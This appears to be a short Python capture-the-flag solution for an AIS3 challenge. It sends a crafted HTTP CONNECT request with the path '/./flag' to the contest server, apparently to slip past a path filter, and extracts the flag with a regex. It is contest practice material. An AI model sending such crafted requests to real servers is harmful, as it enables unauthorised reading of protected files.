import socket
import re

host = 'chals1.ais3.org'
port = 30000  
path = '/./flag'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

request = f"CONNECT {host}{path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
s.sendall(request.encode())

response = s.recv(4096).decode(errors="ignore")

match = re.search(r'AIS3\{.*?\}', response)
if match:
    print("Flag found:", match.group())
else:
    print("Flag not found.")